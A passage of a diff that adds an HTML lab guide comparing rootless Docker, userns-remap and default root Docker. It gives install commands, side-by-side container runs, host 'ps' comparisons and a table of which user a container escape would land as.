+  <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null
+
+<span class="hljs-built_in">sudo</span> apt-get update
+<span class="hljs-built_in">sudo</span> apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
+</div></code></pre>
+<p>Verify dockerd runs as root:</p>
+<pre class="hljs"><code><div>ps -ef | grep dockerd
+</div></code></pre>
+<p><strong>2. Install rootless Docker:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> apt-get install docker-ce-rootless-extras
+<span class="hljs-built_in">sudo</span> apt install -y uidmap
+dockerd-rootless-setuptool.sh install
+systemctl --user start docker
+systemctl --user <span class="hljs-built_in">enable</span> docker
+</div></code></pre>
+<p><strong>3. Switch to rootless context and verify:</strong></p>
+<pre class="hljs"><code><div>docker context use rootless
+docker info | grep rootless
+</div></code></pre>
+<p><strong>4. Compare rootless vs root containers:</strong></p>
+<p>Run a container in rootless mode:</p>
+<pre class="hljs"><code><div>docker run -d --<span class="hljs-built_in">rm</span> --name test-rootless alpine <span class="hljs-built_in">sleep</span> 100
+ps -ef | grep <span class="hljs-built_in">sleep</span>
+docker <span class="hljs-built_in">exec</span> test-rootless <span class="hljs-built_in">id</span>
+</div></code></pre>
+<p>Switch back to default (root) Docker and run the same:</p>
+<pre class="hljs"><code><div>docker context use default
+<span class="hljs-built_in">sudo</span> docker run -d --<span class="hljs-built_in">rm</span> --name test-root alpine <span class="hljs-built_in">sleep</span> 200
+ps -ef | grep <span class="hljs-built_in">sleep</span>
+</div></code></pre>
+<p><strong>Observe the difference:</strong> The rootless container's process runs as your normal user, while the default container's process runs as root. This is the key security benefit — even if an attacker escapes the container, they land as an unprivileged user on the host.</p>
+<h3 id="understanding-rootless-mode-vs-userns-remap">Understanding: Rootless mode vs userns-remap</h3>
+<p>Students often confuse these two. They both use user namespaces, but at different levels.</p>
+<p><strong>Run both side-by-side and compare <code>ps -ef</code> output on the host:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-comment"># Terminal 1: Rootless mode (daemon + container both unprivileged)</span>
+docker context use rootless
+docker run -d --<span class="hljs-built_in">rm</span> --name rootless-test alpine <span class="hljs-built_in">sleep</span> 300
+
+<span class="hljs-comment"># Terminal 2: Default Docker with userns-remap (daemon runs as ROOT, container remapped)</span>
+docker context use default
+<span class="hljs-comment"># Enable userns-remap by adding to /etc/docker/daemon.json:</span>
+<span class="hljs-comment"># { &quot;userns-remap&quot;: &quot;default&quot; }</span>
+<span class="hljs-comment"># Then: sudo systemctl restart docker</span>
+<span class="hljs-built_in">sudo</span> docker run -d --<span class="hljs-built_in">rm</span> --name remap-test alpine <span class="hljs-built_in">sleep</span> 300
+
+<span class="hljs-comment"># Terminal 3: Default Docker without remap (daemon + container both root)</span>
+<span class="hljs-built_in">sudo</span> docker run -d --<span class="hljs-built_in">rm</span> --name root-test alpine <span class="hljs-built_in">sleep</span> 300
+</div></code></pre>
+<p><strong>Now compare all three from the host:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;=== Rootless mode ===&quot;</span>
+ps -eo pid,user,args | grep <span class="hljs-string">&quot;sleep 300&quot;</span> | grep -v grep
+
+<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;=== userns-remap mode ===&quot;</span>
+ps -eo pid,user,args | grep <span class="hljs-string">&quot;sleep 300&quot;</span> | grep -v grep
+
+<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;=== Default root mode ===&quot;</span>
+ps -eo pid,user,args | grep <span class="hljs-string">&quot;sleep 300&quot;</span> | grep -v grep
+</div></code></pre>
+<p><strong>Expected results:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Mode</th>
+<th>Docker daemon runs as</th>
+<th>Container process on host</th>
+<th>Container escape lands as</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Default (root)</strong></td>
+<td><code>root</code></td>
+<td><code>root</code></td>
+<td><code>root</code> -- full host compromise</td>
+</tr>
+<tr>
+<td><strong>userns-remap</strong></td>
+<td><code>root</code></td>
+<td><code>165536</code> (remapped UID)</td>
+<td>Unprivileged user, but daemon is still root</td>
+</tr>
+<tr>
+<td><strong>Rootless</strong></td>
+<td>Your user (e.g., <code>ubuntu</code>)</td>
+<td>Your user (e.g., <code>ubuntu</code>)</td>
+<td>Unprivileged user, daemon also unprivileged</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Key takeaway:</strong> userns-remap only remaps the container's UID -- the Docker daemon itself still runs as root, meaning a daemon exploit still gives root. True rootless mode runs <strong>everything</strong> (daemon + containers) unprivileged.</p>
+</blockquote>
+<p><strong>Cleanup:</strong></p>
+<pre class="hljs"><code><div>docker stop rootless-test 2&gt;/dev/null
+<span class="hljs-built_in">sudo</span> docker stop remap-test root-test 2&gt;/dev/null
+</div></code></pre>
+
+</body>
+</html>
